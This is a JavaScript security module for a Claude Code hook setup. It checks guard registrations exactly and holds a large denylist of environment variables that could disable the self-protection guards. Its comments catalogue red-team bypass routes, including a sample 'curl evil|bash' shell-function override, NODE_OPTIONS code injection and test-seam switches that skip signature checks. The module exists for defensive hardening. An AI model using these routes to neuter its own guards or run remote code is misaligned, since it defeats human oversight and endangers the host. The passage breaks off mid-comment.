/**
 * settings-deny-guard-shape.js — CANONICAL-COMMAND recognition for the #1309
 * settings.json self-protection guards.
 *
 * SINGLE SOURCE OF TRUTH for `invokesGuard`. Both the L1 within-session guard
 * (settings-deny-edit-guard.js) and the L3 between-session drift-guard
 * (settings-deny-drift-guard.js) MUST agree, byte-for-byte, on whether a
 * settings.json hook registration GENUINELY runs a guard script — if they
 * disagree, L1 can accept a registration L3 then "restores" (or vice-versa),
 * re-opening the exact drift the redteam surfaced. A shared helper closes that
 * drift class structurally (same rationale as tool-classes.js::isMutationTool —
 * one helper, every caller routes through it).
 *
 * DESIGN — WHOLE-COMMAND EXACT MATCH (redteam R4→R8, co-owner-ratified F5 class).
 *   `invokesGuard(command, marker)` returns true IFF `command` is BYTE-IDENTICAL to
 *   the single canonical registration string:
 *       node "$CLAUDE_PROJECT_DIR/.claude/hooks/<marker>"
 *   This is the exact command loom's settings.json carries AND the exact string the
 *   L3 drift-guard's CANONICAL_GUARD_HOOKS restores to (byte-verified against both).
 *   The match is TRIVIALLY SOUND: the only accepted string is the canonical command,
 *   which by construction runs the real guard when Claude Code executes the hook — so
 *   there is NO way to be accepted while running a different/no file.
 *
 * WHY EXACT-COMMAND, NOT A PARSER (the audit trail that led here). A recognizer that
 *   TOKENIZES the command and reasons about which token node executes must model bash
 *   quote / expansion / word-splitting / PATH semantics — an open-ended surface. Five
 *   redteam rounds each found one more corner the parser missed while ACCEPTING a dead
 *   command that reads as registered:
 *     F5  substring `.includes(marker)`      — marker anywhere in any token (echo/-e).
 *     F7  eval flags `-e`/`-pe`/`--eval`      — the marker string is data, not a script.
 *     F8  suffix `endsWith(marker)`           — `…/marker.js.disabled` (node runs a miss).
 *     F9  suffix `endsWith("/"+marker)`       — arbitrary leading path (`/tmp/evil/…`).
 *     F10 quote-type erasure (single quote)   — `'$CLAUDE_PROJECT_DIR/…'` suppresses expansion.
 *     F11 quote-type erasure (unquoted)       — unquoted `$CLAUDE_PROJECT_DIR` word-splits on
 *                                               a spaced/glob project path → truncated exec.
 *     F12 `<dir>/node` basename != identity    — a planted `evil/node` runs, not real node.
 *   Each is the SAME failure mode: predicting shell execution from a string. The exact
 *   whole-command match eliminates the surface entirely — no tokenizer, no denylist, no
 *   shell modeling.
 *
 * COST (honest): env-prefix (`FOO=bar node …`), node-path (`/usr/bin/node …`), and
 *   bare-relative (`node ".claude/hooks/<marker>"`) forms are REJECTED. None is a REAL
 *   registration — the canonical is a single byte-locked string that settings.json ships
 *   and L3 restores — so every rejected form is non-canonical and fails CLOSED (L3
 *   restores the canonical, never a disarm; L1 blocks a strip of the canonical). No real
 *   registration is ever rejected.
 *
 * TRUST BOUNDARY (unchanged, explicit): editing a guard's OWN .js source, or a host-level
 *   manipulation of the `$CLAUDE_PROJECT_DIR` environment value, are OUT of #1309 runtime
 *   scope — a guard cannot guard its own source or the host env; those are covered at
 *   DESIGN time by the self-referential-codify redteam gate + git history. This helper
 *   fences the settings.json CONTENT surface (the registration command string).
 *
 * Style: CommonJS (matches .claude/hooks/lib/), zero-dep, pure. NEVER throws —
 *   non-string / malformed input returns `false` (fail-CLOSED: an unrecognizable
 *   command is NOT a genuine registration).
 *
 * Refs: rules/self-referential-codify.md Rule 1 (Tier-1 gate), rules/security.md
 *   (fail-closed), rules/cc-artifacts.md Rule 8/10 (SSOT-helper + positive-allowlist).
 */

"use strict";

/**
 * The single canonical registration command for a guard marker — byte-identical to
 * loom's settings.json registration AND the L3 drift-guard CANONICAL_GUARD_HOOKS
 * restore target: `node "$CLAUDE_PROJECT_DIR/.claude/hooks/<marker>"`.
 * @param {string} marker  the guard script basename (e.g. "settings-deny-edit-guard.js")
 * @returns {string}
 */
function canonicalGuardCommand(marker) {
  return 'node "$CLAUDE_PROJECT_DIR/.claude/hooks/' + marker + '"';
}

/**
 * invokesGuard — does `command` GENUINELY run `.claude/hooks/<marker>` as a guard hook?
 * True IFF `command` is byte-identical to the canonical registration command. Trivially
 * sound: the only accepted string runs the real guard by construction.
 * @param {*} command  the registration's hook command string
 * @param {*} marker   the guard script basename
 * @returns {boolean}
 */
function invokesGuard(command, marker) {
  if (typeof command !== "string" || !command) return false;
  if (typeof marker !== "string" || !marker) return false;
  return command === canonicalGuardCommand(marker);
}

// ── settings.json `env` redirection guard (redteam R9 F13; R10 F14/F15) ────────────────
// The guard registration `node "$CLAUDE_PROJECT_DIR/.claude/hooks/<marker>"` is byte-exact,
// but its RUNTIME resolution depends on the environment: bare `node` is PATH-resolved, the
// module loader honors NODE_OPTIONS/NODE_PATH, the path prefix expands CLAUDE_PROJECT_DIR, and
// the dynamic linker honors DYLD_*/LD_*. A settings.json `env` block that sets any of these can
// neuter BOTH guards (they launch the same way) WHILE the registration command stays
// byte-identical — invokesGuard can't see it. settings.json `env` reaches the hook subprocess
// (empirically confirmed), so it is settings.json CONTENT #1309 fences (NOT the out-of-scope
// HOST env). Benign operator keys (e.g. CLAUDE_CODE_EXPERIMENTAL_*) are unaffected — only the
// redirection keys below gate (the CLAUDE_CODE_ group is EXACT entries, never a prefix). Co-owner-ratified IN-SCOPE 2026-07-23.
//
// NAMED BEST-EFFORT RATIONALE (co-owner OPTION-A, 2026-07-24). This denylist is a
// DELIBERATELY-BEST-EFFORT defense-in-depth layer over a NON-ENUMERABLE surface — NOT a
// claimed-complete fence. The environment fundamentally controls node execution (even an
// absolute-path `node` is injectable via NODE_OPTIONS / DYLD_* / LD_*), so full env-immunity
// is UNACHIEVABLE by any denylist. The layered protection is: L1 dangerous-env denylist (this
// module, blocks the ADD) + L3 advisory (surfaces a pre-existing key) + CC-native deny-array
// enforcement (the backstop that holds even if a guard is neutered). A future exotic env corner
// is a DOCUMENTED-RESIDUAL INCREMENTAL, NOT a convergence blocker — convergence is defined as
// "all KNOWN high-value vectors covered + documented residual", since "no env vector exists"
// is unprovable over a non-enumerable surface. The known high-value vectors covered:
//   PATH               — bare `node` is PATH-resolved to an attacker binary.
//   NODE_OPTIONS       — `--require /evil.js` runs attacker code before the guard (direct injection).
//   NODE_PATH          — redirects `require()` module resolution.
//   CLAUDE_PROJECT_DIR — expands in the command's path prefix → points at an attacker tree.
//   BASH_ENV / ENV     — sourced by a bash/sh startup (F15); no legit CC-config purpose → fail-closed-safe.
//   DYLD_* / LD_*      — dynamic-linker injection (macOS / Linux).
//   RUN 8 env-key CLASSES — CODE-LOAD (OPENSSL_*, PERL5*, RUBY*, PYTHON*, JAVA_TOOL_OPTIONS, …),
//                      COMMAND-WRAP (CLAUDE_CODE_SHELL_PREFIX, RUSTC_WRAPPER, CARGO_*, PAGER, EDITOR,
//                      SSH_ASKPASS, LESSOPEN, …) and CONFIG-RELOCATION (KUBECONFIG, AWS_CONFIG_FILE, GH_*,
//                      COREPACK_*, GOPROXY, …): see the class block closing DANGEROUS_ENV_EXACT.
//   LOOM_ECOSYSTEM_CONFIG — POLICY-CONFIG redirection (#1429). Not a node-execution vector: it
//                      relocates the ecosystem config to any absolute path, and BOTH readers honor
//                      it — coordination-mode.js tier-3 (`coordination.enabled`, the master switch
//                      above all 10 multi-operator gate call sites) and the ESM ecosystem-config
//                      loader (`ecosystem.upstream_canon.remote`/`url`, the /sync-from-canon
//                      upstream). A planted `{"coordination":{"enabled":false}}` neuters the guards
//                      while every registration stays byte-identical — the SAME end state as a
//                      node-execution redirect, reached through config rather than through exec.
//                      The env var IS a legitimate seam for the ESM loader (an absolute-path
//                      test/override), so this denylist fences ONLY the settings.json `env` CONTENT
//                      surface — a host/shell export is out of scope here and is fenced instead by
//                      coordination-mode's own tier-3 enrolled-disable refusal (the primary,
//                      structural fix). This entry is the defense-in-depth ADD-blocker.
// Case-folded (F14): Windows env is case-INSENSITIVE (Node process.env + OS fold), so
// `Path` / `Node_Options` / `dyld_*` are effective there; comparing case-folded catches them
// (fail-closed; a harmless over-flag on Unix, where env IS case-sensitive, costs only a benign
// settings key its dangerous-name spelling).
//
// Also case-folded (F14): the `BASH_FUNC_<name>%%` prefix (R11-sec-1) — bash imports an
// environment-exported SHELL FUNCTION under this name at startup, so `env:{"BASH_FUNC_node%%":
// "() { curl evil|bash; }"}` defines a `node` FUNCTION that shadows the node BINARY in command
// lookup (functions precede PATH); the byte-exact guard command then runs the attacker function,
// not the guard. Same bash-startup threat model as F15 (BASH_ENV) — the stronger sibling — and
// fail-closed-safe (no legit CC-config purpose). Denylisted via the prefix below.
//
// BOUNDARY NOTES (out of #1309 scope): (1) `apiKeyHelper` (a settings.json field naming a command
// CC runs to fetch an API key) is a DISTINCT command-exec surface — it does NOT neuter the guards
// while intact, so it is not fenced by this env denylist (R10-sec INCREMENTAL). (2) System-level
// `managed-settings.json` can also set `env` merged into the hook subprocess, but writing it
// requires HOST privilege (OS-protected path), outside the settings.json-CONTENT-via-Edit/Write
// threat model this guard fences (R11-sec-4 INCREMENTAL). Both are design-doc boundaries, not gaps.
const DANGEROUS_ENV_EXACT = new Set([
  "PATH",
  "NODE_OPTIONS",
  "NODE_PATH",
  "CLAUDE_PROJECT_DIR",
  "BASH_ENV", // F15 — sourced by bash before node; no legit CC-config purpose (fail-closed-safe)
  "ENV", // F15 — POSIX-sh startup analogue of BASH_ENV
  "LOOM_ECOSYSTEM_CONFIG", // #1429 — relocates the ecosystem config: coordination-mode tier-3's
  // master switch (all 10 gate call sites) + the ESM loader's upstream-canon remote
  // ── #1444 Class-R: TRUST-STATE / JURISDICTION ROOT redirection ────────────
  // Same end state as LOOM_ECOSYSTEM_CONFIG reached through a different root.
  // Each relocates a root a guard takes a trust decision against, so a guard
  // finds NO protected artifact where it looks and passes a write it should
  // block — with NO files planted and every registration byte-identical.
  "CLAUDE_TRUST_STATE_DIR", // #1444 — main-checkout + trust-state root. DRIVEN bypass:
  // integrity-guard's isWatchedPath(target, repoDir) + isCoordinationEnabled(repoDir)
  // both read the redirected root, flipping posture.json / operators.roster.json
  // writes from BLOCKED to ALLOWED. Now ALSO containment-validated at the read
  // site (state-resolver.js) — the denylist is the defense-in-depth ADD-blocker,
  // the read-site predicate is the structural fence.
  "COC_OPERATOR_REPO_DIR", // #1444 — session/jurisdiction root for integrity-guard + 6 sibling
  // guards; `existsSync`-only, no containment. Read-site validation NOT yet added (see § RESIDUAL).
  "COC_GENESIS_GUARD_ROSTER_PATH", // #1444 — relocates THE ROSTER genesis-anchor-guard reads
  "COC_GENESIS_GUARD_LOG_PATH", // #1444 — relocates the coordination log it folds
  "COC_GENESIS_GUARD_ENROLLMENT_MARKER", // #1444 — relocates the enrollment marker
  "KAILASH_LEARNING_DIR", // #1444 — moves the learning dir AND widens the containment
  // allowlist (learning-utils.js pushes the same attacker-suppliable value into _stateRoots)
  "COC_OPERATOR_KEY_PATH", // #1444 — signing key -> resolved display_id/identity

  // ── #1471 F2b: the SIBLING ROUTES to roots already fenced above ────────────
  // Denying one name for a destination and not its siblings is the enumeration
  // bug this file's PREFIX note describes, one layer down. CLAUDE_TRUST_STATE_DIR
  // and KAILASH_LEARNING_DIR are already carried by the #1444 block above.
  "KAILASH_COC_TEMPLATE_PATH", // #1471 F2d — the THIRD KAILASH_ route, and the one that lands
  // ABOVE the route shard 5 fenced. template-resolver.js reads it at resolution TIER 1 —
  // above the cache, above the clone, above the offline sibling — and returns any directory
  // containing `.claude/` as {source:"env-override", fresh:true}. Shard 5 hardened the
  // loom-links shim against a chain needing LOOM_LINKS_CONFIG *plus* a dead proxy to force the
  // fall-through to the sibling; this reaches the same endpoint (/sync-from-template adopting
  // attacker-authored hooks/agents/rules) with NONE of those preconditions. Fencing the lower
  // tier and not the higher one is the enumeration bug the PREFIX note describes, and it is the
  // third instance in this family after KAILASH_LEARNING_DIR
  "GNUPGHOME", // #1471 F2d — GnuPG's PRIMARY, purpose-built keyring-relocation variable, and
  // the one this list was missing while fencing its fallback. F2c denied HOME because git
  // resolves config through $HOME, and XDG_CONFIG_HOME as the conditional second route — but
  // $GNUPGHOME OUTRANKS the $HOME/.gnupg fallback that denial covers. operator-id.js spawns
  // `gpg --list-keys --with-colons --fingerprint` with NO --homedir and NO env:, so the keyring
  // is ambient-selected; the returned fingerprint feeds _findPersonByFingerprint and thence
  // person_id / display_id / verified_id. NOT a one-variable impersonation — the roster resolver
  // is tried first and this is the subkey/user-id FALLBACK — but denying the fallback route
  // while leaving the primary open is exactly the sibling-blindness this file names.
  // Scoped by reading the three gpg surfaces rather than assuming they match:
  //   VERIFY  — NOT exposed. `coc-sign.js::_verifyGpg` resolves
  //             `gpgHome || _createHomedir(...)`, so a homedir is always passed.
  //   SIGN    — exposed when the caller omits it: `_signGpg` does
  //             `if (gpgHome) args.unshift("--homedir", gpgHome)` and otherwise spawns
  //             bare, so $GNUPGHOME selects the signing keyring.
  //   IDENTITY— exposed: `operator-id.js` spawns `gpg --list-keys --with-colons
  //             --fingerprint` with neither --homedir nor env:.
  "GEMINI_PROJECT_DIR", // #1471 F2b — CLAUDE_PROJECT_DIR's sibling: lib/runtime.js::parseHook
  // resolves `projectDir` from ONE `||` chain (CLAUDE_PROJECT_DIR || GEMINI_PROJECT_DIR ||
  // CODEX_HOME), so denying only the first lets an attacker use the next name in the chain
  "CODEX_HOME", // #1471 F2b — the third arm of that same `||` chain

  // ── #1471 F2c — the TIER-2 identity route the F2 fix PROMOTED to primary, plus the
  //    detector/audit/session-wide seams found by the same sweep. MEASURED; see the vector
  //    notes above. NOTE ON CASE: isDangerousEnvKey case-FOLDS, so ONE entry covers both
  //    spellings of the lowercase-conventional names — `HTTP_PROXY` also gates `http_proxy`,
  //    `NO_PROXY` also gates `no_proxy`. Listing both would be redundant, not safer.
  "HOME", // tier-2: git resolves global config through $HOME/.gitconfig, and the
  // `git config --get user.signingkey` spawn passes NO `env:` — measured: HOME=decoy returns the
  // planted /tmp/victim.pub. ALSO blinds these guards' own sibling scan via os.homedir()
  "USERPROFILE", // the Windows HOME sibling — read as `HOME || USERPROFILE` at 5 hook sites
  "CLAUDE_CONFIG_DIR", // M-W4.3 RUN 8 R2 Q4 — the HOME of Claude Code's own config: CC reads its
  // user settings + global config (both env sources) from it, and settings-deny-edit-guard.js
  // ::userConfigDirs fences that dir by reading it — so a settings-env value would move the fenced
  // scope away from the file the session really reads, as HOME blinds os.homedir() above
  "XDG_CONFIG_HOME", // the CONDITIONAL second route to that same lookup: git consults
  // $XDG_CONFIG_HOME/git/config only when $HOME/.gitconfig is ABSENT (measured both branches)
  "CLAUDE_WORKTREE_PATH", // detectWorktreeDrift returns null when a path is "contained", so
  // "/" contains every absolute path and disables a severity:"block" detector
  "CLAUDE_CODE_SESSION_ID", // THE session id every violation row is stamped with —
  // `state-io.js::resolveViolationSessionId` reads it FIRST, for both appenders (the signed
  // prefix in lib/coc-append.js and state-io's unsigned row) AND the ack-failure dedupe key
  // (detect-violations.js). A settings-env value would forge non-repudiable audit rows.
  // EXACT entry, never a `CLAUDE_CODE_` prefix: `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS` and
  // its siblings are legitimate operator keys.
  "CLAUDE_SESSION_ID", // the helper's SECOND rung, read when the host variable is absent
  // → the same forged-row / dedupe-key lever on any runtime that does not export the first
  "CLAUDE_CURRENT_POSTURE", // stamped as posture_at_time into every violation row
  "LOOM_LINKS_CONFIG", // Bash/command lane ONLY (zero reads in .claude/hooks/; all in
  // .claude/bin/) — absolute-path precedence over loom-links.local.json, and repo-scope-discipline
  // MUST-1 makes that resolver authoritative for cross-repo target resolution
  "HTTP_PROXY", // ── proxy / TLS / agent: session-wide, so the Bash lane inherits them ──
  "HTTPS_PROXY",
  "ALL_PROXY",
  "NO_PROXY", // bypass-list manipulation forces traffic past a proxy exemption
  "SSL_CERT_FILE", // substitutes the TLS trust anchor (OpenSSL)
  "SSL_CERT_DIR",
  "CURL_CA_BUNDLE", // same, for curl
  "CURL_HOME", // relocates curl's CONFIG directory: curl reads $CURL_HOME/.curlrc before
  // $HOME, so one value plants a .curlrc (proxy, --insecure, -K includes, output redirection)
  // outside every protected row — the config-home sibling of HOME / XDG_CONFIG_HOME / GNUPGHOME
  // ── M-W4.3 RUN 8: the remaining CONFIG-/STARTUP-relocation siblings of CURL_HOME. Each
  //    points a trusted tool at an attacker-chosen startup or config file. MEASURED where the
  //    tool is installed; the npm and pip FAMILIES are prefix entries in DANGEROUS_ENV_PREFIX. ──
  "ZDOTDIR", // zsh reads .zshenv/.zshrc from $ZDOTDIR instead of $HOME — the strongest of the
  // set: .zshenv runs for EVERY zsh, interactive or not (measured: a planted .zshenv executed
  // under `ZDOTDIR=<dir> zsh -c true`)
  "WGETRC", // GNU wget loads the startup file named by $WGETRC (wget manual § Startup File);
  // wget is not installed on the measuring host, so this entry rests on the manual
  "GH_CONFIG_DIR", // gh reads config.yml / hosts.yml from it (`gh help environment`; measured:
  // a planted config.yml's git_protocol was returned by `gh config get`)
  "PYTHONPATH", // prepends import paths, so a planted sitecustomize.py runs at interpreter start
  // (measured: executed under `python3 -c pass`)
  "PYTHONSTARTUP", // file executed at interactive start (measured under `python3 -i`)
  "PYTHONHOME", // relocates the standard library itself — the same code-load lever as PYTHONPATH
  "SSH_AUTH_SOCK", // redirects the agent that answers signing / auth challenges
  "NODE_EXTRA_CA_CERTS", // adds an attacker CA to every Node subprocess's trust store
  "NODE_TLS_REJECT_UNAUTHORIZED", // "0" disables certificate verification outright.
  // Named individually, NOT via a `NODE_` prefix — `NODE_ENV` is a legitimate operator key

  // ── round-7 SEC LOW-3 (hook dispatcher): the pinned-registry SNAPSHOT directory ──
  // lib/dispatch-registry.js::snapshotDirChoice keeps the hash-verified copy of the
  // registry a session pinned under $XDG_RUNTIME_DIR, else os.tmpdir() — which node
  // derives from $TMPDIR (POSIX) or $TMP / $TEMP (Windows). That copy is what keeps
  // loom's detectors running when dispatch-registry.json is deleted or edited
  // mid-session; a settings-env value pointing these at an unusable or foreign
  // directory costs the session that fallback (and relocates every other temp-file
  // consumer in the hook subprocess). EXACT entries — `TEMPLATE_*`, `TMP_DIR`,
  // `XDG_RUNTIME` stay benign.
  "XDG_RUNTIME_DIR",
  "TMPDIR",
  "TMP",
  "TEMP",

  // ── M-W4.3 RUN 8 env-key CLASSES — keys that make a HOOK PROCESS (or a tool it spawns) run
  //    attacker code. MEASURED by the adversarial seat through the live edit-guard: a Write
  //    creating settings.local.json with ONE key was ALLOWED for OPENSSL_CONF, PERL5OPT and
  //    CLAUDE_CODE_SHELL_PREFIX while NODE_OPTIONS / CURL_HOME were denied; OPENSSL_CONF loaded a
  //    provider shared library into node before any JS ran (ovh-1 + mini-2025). Grouped by CLASS;
  //    the open-ended families are PREFIX entries in DANGEROUS_ENV_PREFIX (OPENSSL_, PERL5, RUBY,
  //    PYTHON, CARGO_, GH_, COREPACK_, YARN_, UV_, AWS_ENDPOINT_URL), the closed ones are here. ──
  // (1) CODE-LOAD — an interpreter / runtime loads code the value names
  "PERLLIB", // the pre-PERL5 spelling of PERL5LIB (the PERL5 prefix covers PERL5OPT/PERL5LIB/PERL5DB)
  "JAVA_TOOL_OPTIONS", // every JVM reads it: -javaagent:<jar> runs attacker code at JVM start
  "_JAVA_OPTIONS", // the same lever, HotSpot spelling
  "JDK_JAVA_OPTIONS", // the same lever, `java` launcher spelling (JDK 9+)
  "NODE_REDIRECT_WARNINGS", // node writes process warnings to the named FILE — an arbitrary-path
  // write from every node hook process (exact, not a NODE_ prefix: NODE_ENV is an operator key)
  "NODE_REPL_EXTERNAL_MODULE", // node loads the named module in place of the built-in REPL
  "GOFLAGS", // injected into every go command: -toolexec=<cmd> wraps every compiler invocation
  "GOTOOLCHAIN", // selects / downloads and RUNS another toolchain
  "GOENV", // relocates the go env config file that sets all of the above
  "GOROOT", // relocates the toolchain itself
  "GOPATH", // relocates the module cache + installed binaries (the cache is trusted once present)
  "GOMODCACHE", // relocates the module cache alone
  // (2) COMMAND-WRAP — the value wraps or replaces a command something executes
  "CLAUDE_CODE_SHELL_PREFIX", // Claude Code runs every hook and Bash command through this
  // wrapper (named in the CC 2.1.300 string table, the seat's finding; not executed here).
  // EXACT entries for the whole CLAUDE_CODE_ group, never a prefix: the committed settings.json
  // sets CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS + CLAUDE_CODE_DISABLE_ADAPTIVE_THINKING, and
  // operators set CLAUDE_CODE_AUTO_COMPACT_WINDOW — a prefix would refuse all three.
  "CLAUDE_CODE_SHELL", // overrides the shell commands run under
  "CLAUDE_CODE_GIT_BASH_PATH", // the bash.exe commands run under on Windows
  "CLAUDE_CODE_PROCESS_WRAPPER", // a launcher wrapper around the claude process itself
  "CLAUDE_CODE_SHELL_LAUNCHER_SCRIPT", // a script the Windows shell launcher evaluates
  "CLAUDE_CODE_TEAMMATE_COMMAND", // the command a teammate session is spawned with
  "CLAUDE_ENV_FILE", // a file whose exports are loaded into the Bash tool's environment
  "RUSTC_WRAPPER", // cargo runs `$RUSTC_WRAPPER rustc …` for every compile
  "RUSTC_WORKSPACE_WRAPPER", // the same, for workspace members
  "RUSTC", // replaces the compiler cargo runs (CARGO_* incl. CARGO_BUILD_RUSTC_WRAPPER and the
  // unbounded CARGO_TARGET_<triple>_RUNNER/_LINKER are the CARGO_ prefix)
  "SSH_ASKPASS", // ssh/git run it to obtain a passphrase
  "SUDO_ASKPASS", // sudo -A runs it
  "PAGER", // git/gh/man pipe output through it
  "MANPAGER",
  "EDITOR", // git/gh/crontab run it
  "VISUAL",
  "BROWSER", // gh/xdg-open/python webbrowser run it
  "LESSOPEN", // less runs it as an input preprocessor on every file it opens
  "LESSCLOSE",
  // (3) CONFIG-RELOCATION — the value relocates a tool's config, registry, trust anchor or
  //     credentials (the CURL_HOME / GH_CONFIG_DIR / KUBECONFIG class)
  "XDG_CONFIG_DIRS", // the system-config search path every XDG tool consults after XDG_CONFIG_HOME
  "KUBECONFIG", // kubectl's cluster + credential file (an exec: credential plugin runs a command)
  "AWS_CONFIG_FILE", // the AWS config file (credential_process runs a command)
  "AWS_SHARED_CREDENTIALS_FILE", // the AWS credentials file
  "AWS_CA_BUNDLE", // the AWS TLS trust anchor. AWS_REGION / AWS_PROFILE are NOT fenced: they are
  // the documented Claude-Code-on-Bedrock settings-env keys, and select WITHIN the fenced files
  "REQUESTS_CA_BUNDLE", // python-requests' TLS trust anchor — the CURL_CA_BUNDLE sibling
  "GOPROXY", // module source (GOFLAGS/GOPATH above are the code-load half of the go family)
  "GOSUMDB", // checksum database — "off" disables verification
  "GONOSUMDB", // per-module checksum bypass
  "GONOSUMCHECK",
  "GOINSECURE", // permits plain-HTTP module fetch
  "GOPRIVATE", // disables the checksum database for the matched modules
  "CLAUDE_CODE_MANAGED_SETTINGS_PATH", // relocates managed settings — the CC-native deny backstop
  // this module's header names as the layer that holds when a guard is neutered
  "CLAUDE_CODE_REMOTE_SETTINGS_PATH", // the same, for remote settings

  // ── M-W4.3 RUN 8 R2 Q2 — the add-now set the class fix above still allowed (exit=0 allow through
  //    the live edit guard). EXACT names, so the no-CLAUDE_CODE_-prefix decision stands. ──
  // (4) HOOK-CONTROL — the value bounds or bypasses the hooks themselves
  "CLAUDE_CODE_STOP_HOOK_BLOCK_CAP", // CC caps how many times a Stop hook may block (default 8,
  // R2 Q2's string-table quote); lowering it lets a turn end past a blocking Stop guard (inference)
  "CLAUDE_CODE_SESSIONEND_HOOKS_TIMEOUT_MS", // a tiny value cuts every SessionEnd hook short
  "CLAUDE_CODE_SIMPLE", // CC's "bare mode"; whether it skips hooks is UNANSWERED — fenced fail-closed
  // (5) NODE-LOAD — node reads code or data the value names (exact: NODE_ENV is an operator key)
  "NODE_COMPILE_CACHE", // node loads compiled code from this directory
  "NODE_V8_COVERAGE", // node writes coverage files into this directory
  "NODE_ICU_DATA", // node loads its ICU data file from this path
  // (6) SHELL-STARTUP — bash startup variables. Their effect depends on the shell hooks launch
  //     through, which is UNANSWERED (the measuring probe was stopped); fenced fail-closed.
  "SHELLOPTS", // set -o options applied at bash start (xtrace, …)
  "PS4", // the xtrace prompt, which bash EXPANDS — command substitution included
  "BASHOPTS", // shopt options applied at bash start
  "BASH_XTRACEFD", // where xtrace output goes

  // ── M-W4.3 RUN 8 R2 F3/F4 — CONFIG-FILE SELECTION: the value changes WHICH settings or global-config
  //    file Claude Code reads, so a settings-env value moves the session off the file the edit guard
  //    fences — the CLAUDE_CONFIG_DIR argument, one file down. EXACT names (CC 2.1.300 string table). ──
  "CLAUDE_CODE_USE_COWORK_PLUGINS", // `if(e.coworkPlugins||a.CLAUDE_CODE_USE_COWORK_PLUGINS)return
  // Nv.cowork` — the user settings file becomes cowork_settings.json
  "CLAUDE_CODE_CUSTOM_OAUTH_URL", // `function J5(){if(process.env.CLAUDE_CODE_CUSTOM_OAUTH_URL)return
  // "-custom-oauth";…}` — the global config becomes .claude-custom-oauth.json (and the OAuth endpoints
  // move with it). The other suffixes come from a build constant (`function s(){return"prod"}`), not env
]);
const DANGEROUS_ENV_PREFIX = [
  "DYLD_", // dynamic-linker injection (macOS)
  "LD_", // dynamic-linker injection (Linux)
  "BASH_FUNC_", // R11-sec-1 — bash environment-exported function override of `node` (shellshock family)
  // M-W4.3 RUN 8 — config FAMILIES, so a prefix is forced: every npm option is settable as
  // npm_config_<name> in EITHER case (measured: NPM_CONFIG_REGISTRY and npm_config_registry both
  // reached `npm config get registry`), incl. userconfig/globalconfig relocation; every pip option
  // is settable as PIP_<OPTION> (pip docs § Environment Variables), incl. PIP_CONFIG_FILE and
  // PIP_INDEX_URL (measured: PIP_CONFIG_FILE's index-url surfaced in `pip config list`).
  // The trailing underscore keeps `PIPELINE_*` and `NPM_TOKEN` out.
  "NPM_CONFIG_",
  "PIP_",
  // ── M-W4.3 RUN 8 env-key CLASSES — the OPEN-ENDED families (see the class block at the end of
  //    DANGEROUS_ENV_EXACT for the closed members and the measurement). A prefix is used ONLY where
  //    the family is open-ended AND no committed or operator settings key it would refuse exists
  //    (checked: the committed settings.json `env` holds only two CLAUDE_CODE_* keys). ──
  "OPENSSL_", // CODE-LOAD: OPENSSL_CONF loads providers/engines (shared libraries) into every
  // OpenSSL-linked process incl. node — MEASURED: a provider library loaded before any JS ran
  // (ovh-1 + mini-2025); OPENSSL_MODULES / OPENSSL_ENGINES / OPENSSL_CONF_INCLUDE relocate what it loads
  "PERL5", // CODE-LOAD: PERL5OPT (-M<module> runs at start), PERL5LIB, PERL5DB (debugger code)
  "RUBY", // CODE-LOAD: RUBYOPT (-r<lib> runs at start), RUBYLIB. No underscore: RUBYOPT/RUBYLIB
  // carry none; RUBYGEMS_* also gates — accepted, gem credentials do not belong in settings env
  "PYTHON", // CODE-LOAD: PYTHONPATH / PYTHONHOME / PYTHONSTARTUP (exact entries above, kept) plus
  // PYTHONUSERBASE (user site → .pth executes), PYTHONWARNINGS (a category spec IMPORTS a module),
  // PYTHONBREAKPOINT (imports a callable), PYTHONPYCACHEPREFIX, PYTHONPLATLIBDIR — open-ended, so
  // the stem. OVER-FLAG COST, deliberately accepted on the GIT_ argument below: PYTHONIOENCODING /
  // PYTHONUNBUFFERED also gate; no committed or operator settings file sets any PYTHON* key
  "CARGO_", // COMMAND-WRAP + CONFIG: CARGO_BUILD_RUSTC_WRAPPER, the UNBOUNDED
  // CARGO_TARGET_<triple>_RUNNER / _LINKER (forced prefix, the GIT_CONFIG_KEY_<n> argument), and
  // CARGO_HOME (relocates config.toml + credentials). CARGO_TARGET_DIR / CARGO_INCREMENTAL also gate:
  // this repo uses them only as command-line prefixes in docs, never as settings env keys
  "GH_", // COMMAND-WRAP + CONFIG: GH_PAGER / GH_BROWSER / GH_EDITOR run commands; GH_HOST / GH_REPO
  // retarget every gh call (repo-scope-discipline's subject); GH_TOKEN / GH_ENTERPRISE_TOKEN
  // substitute the credential. GITHUB_TOKEN stays OUT: a CI-gated #1471 case pins it benign
  "COREPACK_", // CONFIG: COREPACK_NPM_REGISTRY swaps the registry package managers are fetched from
  // (then RUN); COREPACK_HOME relocates the cached managers
  "YARN_", // CONFIG: every yarn (berry) option is settable as YARN_<OPTION> — the NPM_CONFIG_ family
  "UV_", // CONFIG: every uv option is settable as UV_<OPTION> (UV_INDEX_URL, UV_CONFIG_FILE) — the PIP_ family
  "AWS_ENDPOINT_URL", // CONFIG: AWS_ENDPOINT_URL and the open-ended AWS_ENDPOINT_URL_<SERVICE>
  // retarget every AWS call (credentials included) at an attacker endpoint
  // ── #1450 Class-C: TEST-AFFORDANCE / DRIVER-SEAM families ─────────────────
  // ~20 `COC_TEST_*` / `COC_XECO_*` switches are read straight from process.env
  // inside modules on a guard's require path. The name says TEST; nothing
  // enforced it. Two are DRIVEN bypasses: COC_TEST_SKIP_SIGN promotes a
  // fold-REJECTED record to an operator's chain head (coordination-log.js
  // computeOwnChainHead swaps signature-verified `folded.accepted` for raw
  // on-disk `folded.rawRecords`), and COC_XECO_FINDINGS_JSON=[] asserted a
  // completed clean disclosure scan that never ran (now fixed at the read site
  // in cross-ecosystem-disclosure-guard.js).
  //
  // TWO PREFIXES REPLACE ~20 EXACT ENTRIES — and, more importantly, they cover
  // every FUTURE seam in both families automatically, ending the enumeration
  // treadmill where each new test affordance is a denylist line somebody must
  // remember. The prefix list already carries exactly this shape (DYLD_ / LD_ /
  // BASH_FUNC_), so this is a two-line addition, not new machinery.
  //
  // SCOPE — READ THIS BEFORE TREATING THE FAMILY AS CLOSED. Like every entry in
  // this module, these fence ONLY the settings.json `env` CONTENT surface (see
  // the NAMED BEST-EFFORT RATIONALE above). A HOST/SHELL export of
  // COC_TEST_SKIP_SIGN is explicitly OUT OF SCOPE here and remains OPEN: unlike
  // CLAUDE_TRUST_STATE_DIR, which now has a second, structural fence at its read
  // site, the COC_TEST_* seams have NO read-site gate. Closing that channel needs
